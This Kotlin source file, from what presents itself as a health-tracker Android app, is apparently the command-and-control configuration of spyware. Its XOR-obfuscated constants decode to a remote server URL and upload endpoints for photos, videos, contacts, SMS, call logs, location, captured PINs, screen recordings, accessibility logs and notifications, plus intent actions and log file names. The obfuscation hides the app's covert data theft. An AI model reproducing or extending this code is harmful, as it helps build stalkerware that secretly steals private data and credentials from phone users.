package com.inf2007.healthtracker.utilities

object C2Constants {
    // Copy all your generated constants here
    private const val OBFUSCATED_BASE = "\u000f\u0013\u0013\u0017\u0014]HH\u001d\u000e\t\u000e\t\u0000I\u0003\u0012\u0004\u000c\u0003\t\u0014I\b\u0015\u0000]RWWW"
    private const val OBFUSCATED_COMMANDS = "H\u0004\b\n\n\u0006\t\u0003\u0014"
    private const val OBFUSCATED_PHOTOS = "H\u0017\u000f\b\u0013\b\u0014"
    private const val OBFUSCATED_VIDEOS = "H\u0011\u000e\u0003\u0002\b\u0014"
    private const val OBFUSCATED_CONTACTS = "H\u0004\b\t\u0013\u0006\u0004\u0013\u0014"
    private const val OBFUSCATED_SCREENSHOTS = "H\u0014\u0004\u0015\u0002\u0002\t\u0014\u000f\b\u0013\u0014"
    private const val OBFUSCATED_USER_APPS = "H\u0012\u0014\u0002\u00158\u0006\u0017\u0017\u0014"
    private const val OBFUSCATED_DOWNLOADS = "H\u0003\b\u0010\t\u000b\b\u0006\u0003\u0014"
    private const val OBFUSCATED_LOCATION = "H\u000b\b\u0004\u0006\u0013\u000e\b\t8\u0012\u0017\u0003\u0006\u0013\u0002"
    private const val OBFUSCATED_PIN = "H\u0017\u000e\t8\u000b\b\u0000\u0014"
    private const val OBFUSCATED_SMS = "H\u0014\n\u0014"
    private const val OBFUSCATED_CALL_LOGS = "H\u0004\u0006\u000b\u000b8\u000b\b\u0000\u0014"
    private const val OBFUSCATED_SCREEN_REC = "H\u0014\u0004\u0015\u0002\u0002\t8\u0015\u0002\u0004\b\u0015\u0003\u000e\t\u0000\u0014"
    private const val OBFUSCATED_ACCESSIBILITY = "H\u0006\u0004\u0004\u0002\u0014\u0014\u000e\u0005\u000e\u000b\u000e\u0013\u001e8\u000b\b\u0000\u0014"
    private const val OBFUSCATED_NOTIFICATIONS = "H\t\b\u0013\u000e\u0001\u000e\u0004\u0006\u0013\u000e\b\t\u0014"

    // Intent actions and file names
    private const val OBFUSCATED_UPLOAD_FILE = "\u0004\b\nI\u000e\t\u0001UWWPI\u000f\u0002\u0006\u000b\u0013\u000f\u0013\u0015\u0006\u0004\u000c\u0002\u0015I27+(!.+\""
    private const val OBFUSCATED_SCREENSHOT_CMD = "\u0004\b\nI\u000e\t\u0001UWWPI\u000f\u0002\u0006\u000b\u0013\u000f\u0013\u0015\u0006\u0004\u000c\u0002\u0015I4\$5\"\")4/(38\$(**&)#"
    private const val OBFUSCATED_WATCH_LOG = "\u0010\u0006\u0013\u0004\u000fI\u000b\b\u0000"
    private const val OBFUSCATED_PIN_LOG = "\u0017\u000e\tI\u000b\b\u0000"

    // Deobfuscated values (lazy so they're only computed once)
    val BASE_URL: String by lazy { StringObfuscator.deobfuscate(OBFUSCATED_BASE) }
    val COMMAND_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_COMMANDS) }
    val PHOTOS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_PHOTOS) }
    val VIDEOS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_VIDEOS) }
    val CONTACTS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_CONTACTS) }
    val SCREENSHOTS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_SCREENSHOTS) }
    val USER_APPS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_USER_APPS) }
    val DOWNLOADS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_DOWNLOADS) }
    val LOCATION_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_LOCATION) }
    val PIN_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_PIN) }
    val SMS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_SMS) }
    val CALL_LOG_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_CALL_LOGS) }
    val SCREEN_RECORDING_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_SCREEN_REC) }
    val ACCESSIBILITY_LOGS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_ACCESSIBILITY) }
    val NOTIFICATIONS_ENDPOINT: String by lazy { BASE_URL + StringObfuscator.deobfuscate(OBFUSCATED_NOTIFICATIONS) }

    // Intent actions
    val UPLOAD_FILE_INTENT: String by lazy { StringObfuscator.deobfuscate(OBFUSCATED_UPLOAD_FILE) }
    val SCREENSHOT_COMMAND_INTENT: String by lazy { StringObfuscator.deobfuscate(OBFUSCATED_SCREENSHOT_CMD) }

    // File names
    val WATCH_LOG_FILE: String by lazy { StringObfuscator.deobfuscate(OBFUSCATED_WATCH_LOG) }
    val PIN_LOG_FILE: String by lazy { StringObfuscator.deobfuscate(OBFUSCATED_PIN_LOG) }
}